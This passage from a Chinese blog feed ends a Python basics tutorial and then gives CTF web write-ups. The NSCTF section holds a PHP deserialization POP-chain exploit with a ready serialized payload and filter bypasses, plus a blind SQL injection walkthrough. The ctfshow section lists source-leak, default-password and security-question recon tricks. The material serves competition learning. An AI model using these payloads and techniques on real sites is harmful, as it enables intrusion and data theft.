class="string">&quot;这是个女人！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好像有什么不符合常理的事情发生了！！&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法的输入&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是个人妖！&quot;</span>)</span><br></pre></td></tr></table></figure><p>更多的时候，你需要使用raise抛出你自定义的异常，如下面所述!</p><h3 id="自定义异常">自定义异常</h3><p>Python内置了很多的异常类，并且这些类都是从BaseException类派生的。</p><p>下面是一些常见异常类，请把它们记下来！这样你在见到大多数异常的时候都能快速准确的判断异常类型。</p><table><thead><tr><th>异常名</th><th>解释</th></tr></thead><tbody><tr><td>AttributeError</td><td>试图访问一个对象没有的属性</td></tr><tr><td>IOError</td><td>输入/输出异常</td></tr><tr><td>ImportError</td><td>无法引入模块或包；多是路径问题或名称错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>IndexError</td><td>下标索引错误</td></tr><tr><td>KeyError</td><td>试图访问不存在的键</td></tr><tr><td>KeyboardInterrupt</td><td>Ctrl+C被按下，键盘终止输入</td></tr><tr><td>NameError</td><td>使用未定义的变量</td></tr><tr><td>SyntaxError</td><td>语法错误</td></tr><tr><td>TypeError</td><td>传入对象的类型与要求的不符合</td></tr><tr><td>UnboundLocalError</td><td>试图访问一个还未被设置的局部变量</td></tr><tr><td>ValueError</td><td>传入一个调用者不期望的值，即使值的类型是正确的</td></tr><tr><td>OSError</td><td>操作系统执行错误</td></tr></tbody></table><p>大多数情况下，上面的内置异常已经够用了，但是有时候你还是需要自定义一些异常。自定义异常应该继承<code>Exception</code>类，直接继承或者间接继承都可以，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyExcept</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, msg</span>):</span><br><span class="line">        self.message = msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> MyExcept(<span class="string">&#x27;我的异常!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> MyExcept <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)　</span><br></pre></td></tr></table></figure><p>异常的名字都以<code>Error</code>结尾，我们在为自定义异常命名的时候也需要遵守这一规范，就跟标准的异常命名一样。</p><h3 id="模块与包">模块与包</h3><p>在编程语言中，代码块、函数、类、模块，一直到包，逐级封装，层层调用。**在Python中，一个<code>.py</code>文件就是一个模块，模块是比类更高一级的封装。**在其他语言，被导入的模块也通常称为库。</p><p><strong>模块可以分为自定义模块、内置模块和第三方模块</strong>。自定义模块就是你自己编写的模块，如果你自认水平很高，也可以申请成为Python内置的标准模块之一！如果你在网上发布自己的模块并允许他人使用，那么就变成了第三方模块。内置模块是Python“内置电池”哲学的体现，在安装包里就提供了跨平台的一系列常用库，涉及方方面面。第三方模块的数量非常庞大，有许多非常有名并且影响广泛的模块，比如Django。</p><p>使用模块有什么好处？</p><ul><li>首先，提高了代码的可维护性。</li><li>其次，编写代码不必从零开始。当一个模块编写完毕，就可以被其他的模块引用。不要重复造轮子，我们简简单单地使用已经有的模块就好了。</li><li>使用模块还可以避免类名、函数名和变量名发生冲突。相同名字的类、函数和变量完全可以分别存在不同的模块中。但是也要注意尽量不要与内置函数名（类名）冲突。</li></ul><p><strong>为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package），包是模块的集合，比模块又高一级的封装</strong>。没有比包更高级别的封装，但是包可以嵌套包，就像文件目录一样</p><p><strong>包名通常为全部小写，避免使用下划线。</strong></p><hr><p>要在我们的程序中，使用其它的模块（包、类、函数），就必须先导入对应的模块（包、类、函数）。在Python中，模块（包、类、函数）的导入方式有以下四种：</p><ul><li><code>import xx.xx</code></li><li><code>from xx.xx import xx</code></li><li><code>from xx.xx import xx as rename</code></li><li><code>from xx.xx import *</code></li></ul><p><strong>对于<code>xx.xx</code>的说明：</strong></p><p>由于一个模块可能会被一个包封装起来，而一个包又可能会被另外一个更大的包封装起来，所以我们在导入的时候，需要提供导入对象的绝对路径，也就是<code>“最顶层的包名.次一级包名.（所有级别的包名）.模块名.类名.函数名”</code>。类似文件系统的路径名，只是用圆点分隔的。</p><p>有时候，模块名就在搜索路径根目录下，那么可以直接<code>import 模块名</code>，比如Python内置的一些标准模块，<code>os、sys、time</code>等等。</p><p>大多数时候，我们不需要直接导入到函数的级别，只需要导入到模块级别或者类的级别，就只需要使用<code>import Django.contrib.auth.models</code>导入models模块，以后使用<code>models.User</code>来引用models模块中的类。</p><p>总之，对于<code>xx.xx</code>，你想导入到哪个级别，取决于你的需要，可以灵活调整，没有固定的规则。</p><ol><li><code>import xx.xx</code></li></ol><p>这会将对象（这里的对象指的是包、模块、类或者函数，下同）中的所有内容导入。如果该对象是个模块，那么调用对象内的类、函数或变量时，需要以<code>module.xxx</code>的方式。</p><p>比如，被导入的模块<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Module_a.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is module A!&quot;</span>) </span><br></pre></td></tr></table></figure><p>在<code>Main.py</code>中导入<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> module_a</span><br><span class="line"></span><br><span class="line">module_a.func()  <span class="comment"># 调用方法</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>From xx.xx import xx.xx</code></li></ol><p>从某个对象内导入某个指定的部分到当前命名空间中，不会将整个对象导入。这种方式可以节省写长串导入路径的代码，但要小心名字冲突。</p><p>在<code>Main.py</code>中导入<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> func</span><br><span class="line"></span><br><span class="line">module_a.func()   <span class="comment"># 错误的调用方式</span></span><br><span class="line"></span><br><span class="line">func()  <span class="comment"># 这时需要直接调用func</span></span><br></pre></td></tr></table></figure><ol start="3"><li><code>from xx.xx import xx as rename</code></li></ol><p>为了避免命名冲突，在导入的时候，可以给导入的对象重命名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> func <span class="keyword">as</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(): <span class="comment">## main模块内部已经有了func函数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is main module!&quot;</span>)</span><br><span class="line"></span><br><span class="line">func()</span><br><span class="line">f()</span><br></pre></td></tr></table></figure><ol start="4"><li><code>from xx.xx import *</code></li></ol><p>将对象内的所有内容全部导入。非常容易发生命名冲突，请慎用！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is main module!&quot;</span>)</span><br><span class="line"></span><br><span class="line">func()  <span class="comment"># 从module导入的func被main的func覆盖了</span></span><br></pre></td></tr></table></figure><p>执行结果：<code>this is main module!</code></p><p><strong>模块搜索路径</strong></p><p>不管你在程序中执行了多少次import，一个模块只会被导入一次。这样可以防止一遍又一遍地导入模块，节省内存和计算资源。那么，当使用import语句的时候，Python解释器是怎样找到对应的文件的呢？</p><p><strong>Python根据<code>sys.path</code>的设置，按顺序搜索模块。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;C:\\Python36\\Lib\\idlelib&#x27;</span>, <span class="string">&#x27;C:\\Python36\\python36.zip&#x27;</span>, <span class="string">&#x27;C:\\Python36\\DLLs&#x27;</span>, <span class="string">&#x27;C:\\Python36\\lib&#x27;</span>, <span class="string">&#x27;C:\\Python36&#x27;</span>, <span class="string">&#x27;C:\\Python36\\lib\\site-packages&#x27;</span>]</span><br></pre></td></tr></table></figure><p>当然，这个设置是可以修改的，就像windows系统环境变量中的path一样，可以自定义。 通过<code>sys.path.append('路径')</code>的方法为<code>sys.path</code>路径列表添加你想要的路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">new_path = os.path.abspath(<span class="string">&#x27;../&#x27;</span>)</span><br><span class="line">sys.path.append(new_path)</span><br></pre></td></tr></table></figure><p>默认情况下，模块的搜索顺序是这样的：</p><ol><li>当前执行脚本所在目录</li><li>Python的安装目录</li><li>Python安装目录里的site-packages目录</li></ol><p>其实就是“自定义”——&gt;“内置”——&gt;“第三方”模块的查找顺序。任何一步查找到了，就会忽略后面的路径，所以模块的放置位置是有区别的。<br>总结：千万不要和内置模块或常用第三方模块同名！否则，哪怕你认为自己掌控着一切，也有可能会发生各种意想不到的结果！<br>只有包含<code>__init__.py</code>文件的目录才会被认作是一个包！<code>__init__.py</code>本身就是一个模块，但是要注意，它的模块名是它所在的包名而不是<code>__init__</code>。</p><p><em>一个使用第三方模块——openpyxl操作excel的小例子</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook, load_workbook</span><br><span class="line"></span><br><span class="line">wb1 = load_workbook(<span class="string">&quot;普通学生专业分流成绩-公示.xlsx&quot;</span>)</span><br><span class="line">wb2 = load_workbook(<span class="string">&quot;2022专业分流班级信息列表.xlsx&quot;</span>)</span><br><span class="line">wb3 = Workbook()</span><br><span class="line">sheet = wb3.active</span><br><span class="line">sheet1 = wb1[<span class="string">&quot;sheet1&quot;</span>]</span><br><span class="line">sheet2 = wb2[<span class="string">&quot;全部&quot;</span>]</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">sheet.append([<span class="string">&quot;排名&quot;</span>, <span class="string">&quot;原排名&quot;</span>, <span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;班号&quot;</span>])</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet1.iter_rows(min_row=<span class="number">2</span>, max_row=<span class="number">458</span>, max_col=<span class="number">3</span>):</span><br><span class="line">    name = row[<span class="number">2</span>].value</span><br><span class="line">    <span class="keyword">for</span> row2 <span class="keyword">in</span> sheet2.iter_rows(min_row=<span class="number">356</span>, max_row=<span class="number">459</span>):</span><br><span class="line">        <span class="keyword">if</span> name == row2[<span class="number">2</span>].value:</span><br><span class="line">            sheet.append([count, row[<span class="number">0</span>].value, name, row2[<span class="number">3</span>].value, <span class="built_in">str</span>(row2[<span class="number">5</span>].value)[<span class="number">5</span>]])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">wb3.save(<span class="string">&quot;2022级网安排名.xlsx&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>常用标准库</strong></p><p>Python奉行“内置电池”的哲学，内置了大量、全面、高效和跨平台的标准库，提供了非常丰富的功能，能够满足大多数常见的需求。并且很多都是用C语言编写的，执行速度也很快。</p><p>我们应该尽量多学习这些标准库，理解它们、掌握它们然后使用它们，避免重复造轮子，增强我们的开发能力，提高开发速度。</p><p>以下为常用的模块：</p><ul><li>os</li><li>sys</li><li>subprocess</li><li>random</li><li>bisect</li><li>hashlib</li><li>queue</li><li>fileinput</li><li>shutil</li><li>zipfile</li><li>tarfile</li><li>getpass</li><li>shelve</li><li>json</li><li>pickle</li><li>time</li><li>datetime</li><li>timeit</li><li>logging</li><li>re</li></ul><p>具体用法可查看<a href="https://www.liujiangblog.com/course/python/53">python常用标准库</a></p><p><strong>那么到此为止关于python（基础篇）的内容就将结束，当然还有很多方面没有涉猎，包括但不限于python与数据库的联合，多进程协程与异步，web开发与网络爬虫等等，碍于篇幅，今后填坑</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSCTF Web方向部分题解</title>
      <link href="/2023/07/20/NSctf/"/>
      <url>/2023/07/20/NSctf/</url>
      
        <content type="html"><![CDATA[<p>第一次参加这种正式的组队赛，<s>被大佬带飞这种事请让我多多体验</s><br><img src="https://img1.imgtp.com/2023/07/24/MkGa1pya.png" alt="最终成绩"><br>在学长的鼓励和帮助下，虽然略有遗憾，不过还是取得了满意的成绩<br><strong>继续沉淀</strong></p><hr><h2 id="bombombom-签到题">bombombom --签到题</h2><p>游戏题，类似4399上的炸弹人<br>应该是js前台调试，查看脚本搜索flag出现条件无果<br>直接手打通关</p><p>苟就完了</p><hr><h2 id="ezpop">ezpop</h2><p>给出php源码，考察php反序列化构造pop链和绕过限制<br>调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ctf::__destruct</span><br><span class="line">↓</span><br><span class="line">Happy::__toString</span><br><span class="line">↓</span><br><span class="line">Game::__get</span><br><span class="line">↓</span><br><span class="line">Game::__call</span><br></pre></td></tr></table></figure><p>三个绕过思路：</p><ol><li>md5值：2023的md5值刚满⾜条件</li><li>php过滤：双写</li><li>随机数检验：利⽤引⽤</li></ol><p>在robots.txt发现flag位置<code>fllllllllllllllllllllllllllllag.php</code></p><blockquote><p>注意，由于存在过滤，还需要将序列化字符串中的变量⻓度数值进⾏修改</p></blockquote><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;maybe you can find something in somewhere&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;str-&gt;des;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;heihei&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$rand</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$temp</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rand = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;rand === <span class="variable language_">$this</span>-&gt;temp)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag/i&quot;</span>, <span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> ;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>=<span class="string">&quot;fllllllllllllllllllllllllllllag.pphphp&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$x</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">des</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;a class&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;<span class="subst">$str</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>本地运行后构造出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?try_some_num=2023&amp;pop=O%3A3%3A%22Ctf%22%3A3%3A%7Bs%3A4%3A%22file%22%3BO%3A5%3A%22Happy%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Game%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A3%3A%22hhh%22%3Bs%3A7%3A%22%00Game%00x%22%3Bs%3A35%3A%22fllllllllllllllllllllllllllllag.pphphp%22%3B%7D%7Ds%3A4%3A%22rand%22%3BN%3Bs%3A4%3A%22temp%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure><hr><h2 id="scorequery">ScoreQuery</h2><p>根据题目描述，是道sql注入<br>通过手测发现闭合是单引号,可以用%23注释<br>fuzz后发现过滤了<br><img src="https://img1.imgtp.com/2023/07/24/FlAAWYxh.png" alt=""><br>正常的布尔盲注就行了,用脚本爆破发现不行<br>只有用bp手打了<br><img src="https://img1.imgtp.com/2023/07/24/W1g3VCSC.png" alt=""></p><p><img src="https://img1.imgtp.com/2023/07/24/XZqzCxuI.png" alt=""><br>发现开始返回长度2485时候回显没有,说明此时位置就是ascii码<br>依次爆破表名字段 flag<br><img src="https://img1.imgtp.com/2023/07/24/UNcCpRuS.png" alt=""><br>将爆破出来的数据丢给chagpt<br><img src="https://img1.imgtp.com/2023/07/24/5EZPlaH3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-信息打点、爆破</title>
      <link href="/2023/07/16/CTFshow/CTFshow1/"/>
      <url>/2023/07/16/CTFshow/CTFshow1/</url>
      
        <content type="html"><![CDATA[<h1>信息搜集</h1><h2 id="1-web1">1.web1</h2><h3 id="题目描述">题目描述</h3><p><strong>开发注释未及时删除</strong></p><h3 id="解题思路">解题思路</h3><p><code>F12</code>查看源代码获得flag<br><img src="https://img1.imgtp.com/2023/07/16/PapY4seN.png" alt="web1"></p><h2 id="1-web2">1.web2</h2><h3 id="题目描述">题目描述</h3><p><strong>js前台拦截 === 无效操作</strong></p><h3 id="解题思路">解题思路</h3><p>js前台拦截无法查看源代码<br>BP抓包放包得到flag(或使用curl方法)<br><img src="https://img1.imgtp.com/2023/07/16/xQ2fIuFx.png" alt="web2"><br><strong>查看其他师傅WP了解的方法：</strong><br><strong>url前加view-source: 查看源代码</strong><br><strong>直接<code>ctrl+u</code>查看源代码</strong><br><strong>使用爬虫办法，即reaquest.get(未尝试)</strong></p><h2 id="1-web3">1.web3</h2><h3 id="题目描述">题目描述</h3><p><strong>没思路的时候抓个包看看，可能会有意外收获</strong></p><h3 id="解题思路">解题思路</h3><p>源代码并未泄露任何信息，按照hint抓包在响应头中发现flag<br>或F12 -&gt; 网络 -&gt; F5刷新界面 -&gt; 查看响应头<br><img src="https://img1.imgtp.com/2023/07/16/Qnh8d1dO.png" alt="web3"></p><h2 id="1-web4">1.web4</h2><h3 id="题目描述">题目描述</h3><p><strong>总有人把后台地址写入robots，帮黑阔大佬们引路。</strong></p><h3 id="解题思路">解题思路</h3><p><s>一直粘图片实在太累，开始水</s><br>根据提示访问/robots.txt(常用姿势)<br>记录了flag位于/flagishere.txt<br>直接跳转拿到flag</p><h2 id="1-web5">1.web5</h2><h3 id="题目描述">题目描述</h3><p><strong>phps源码泄露有时候能帮上忙</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示是phps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取<br>其他常见的有linux的备份文件，比如<code>index.php.swp</code>、<code>www.zip</code></p><h2 id="1-web6">1.web6</h2><h3 id="题目描述">题目描述</h3><p><strong>解压源码到当前目录，测试正常，收工</strong></p><h3 id="解题思路">解题思路</h3><p>用dirsearch扫到泄露文件<code>/www.zip</code><br>直接访问解压得到flag路径 <code>//flag in fl000g.txt</code></p><h2 id="7-web7">7.web7</h2><h3 id="题目描述">题目描述</h3><p><strong><code>版本控制</code>很重要，但不要部署到生产环境更重要。</strong></p><h3 id="解题思路">解题思路</h3><p>考察git代码泄露，直接访问url/.git/index.php</p><h2 id="8-web8">8.web8</h2><h3 id="题目描述">题目描述</h3><p><strong><code>版本控制</code>很重要，但不要部署到生产环境更重要。</strong></p><h3 id="解题思路">解题思路</h3><p>考察信息svn泄露,直接访问url/.svn/</p><h2 id="9-web9">9.web9</h2><h3 id="题目描述">题目描述</h3><p><strong>发现网页有个错别字？赶紧在生产环境<code>vim</code>改下，不好，死机了</strong></p><h3 id="解题思路">解题思路</h3><p>考察vim缓存信息泄露，直接访问url/index.php.swp<br>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>详细说明及其他信息搜集知识可参考<a href="https://blog.csdn.net/a597934448/article/details/105431367">CTFhub-Web技能树之信息泄露</a></p><h2 id="10-web10">10.web10</h2><h3 id="题目描述">题目描述</h3><p><strong><code>cookie</code> 只是一块饼干，不能存放任何隐私数据</strong></p><h3 id="解题思路">解题思路</h3><p>参考cookie，直接抓包，在请求数据包看到flag<br>或F12在网络中查看请求头得到cookie值<br>注{ }通过了url编码  { ===%7B  }===%7D</p><h2 id="11-web11">11.web11</h2><h3 id="题目描述">题目描述</h3><p><strong><code>域名</code>其实也可以隐藏信息，<a href="http://xn--flag-f96g315g.ctfshow.com">比如flag.ctfshow.com</a> 就隐藏了一条信息<br>由于动态更新，txt记录会变<br>最终flag flag{just_seesee}</strong></p><h3 id="解题思路">解题思路</h3><p>通过dns检查查询域名 TXT 记录，一般指为某个主机名或域名设置的说明。<br>查找flag.ctfshow.com域名下的txt记录<br>推荐网站<a href="http://dbcha.com/">域名解析查询</a>  <a href="https://zijian.aliyun.com/">阿里云网站运维检测平台</a></p><h2 id="12-web12">12.web12</h2><h3 id="题目描述">题目描述</h3><p><strong>有时候网站上的公开信息，就是管理员常用密码</strong></p><h3 id="解题思路">解题思路</h3><p>dirsearch扫描或查看/robots.txt发现目录/admin<br>根据提示查看网页，发现最下面有一个特别的number 猜想可能为某个密码<br>登陆后台拿到flag</p><h2 id="13-web13">13.web13</h2><h3 id="题目描述">题目描述</h3><p><strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示发现网页中帮助文档，其中泄露登陆后台和账号密码，登陆获得flag<br>注意把your-domain改为靶场地址<br><s>好弱智</s></p><h2 id="14-web14">14.web14</h2><h3 id="题目描述">题目描述</h3><p><strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示查看源码 <code>ctrl F</code>搜索editor(编辑器)发现/editor路径<br>找到文件上传可以查看全部路径，首先查看web根目录/var/www/html<br>发现可疑文件夹打开找到flag路径/editor/attached/file/var/www/html/nothinghere/fl000g.txt<br>此为相对路径，仿照源码中/upload下图片<br>访问绝对路径/nothinghere/fl000g.txt</p><h2 id="15-web15">15.web15</h2><h3 id="题目描述">题目描述</h3><p><strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></p><h3 id="解题思路">解题思路</h3><p>跳转/admin发现后台登陆<br>按照提示使用邮箱作为密码登陆失败<br>回答密保问题重置密码，社工QQ号IP地址为西安<br>重置密码后登陆获得flag</p><h2 id="16-web16">16.web16</h2><h3 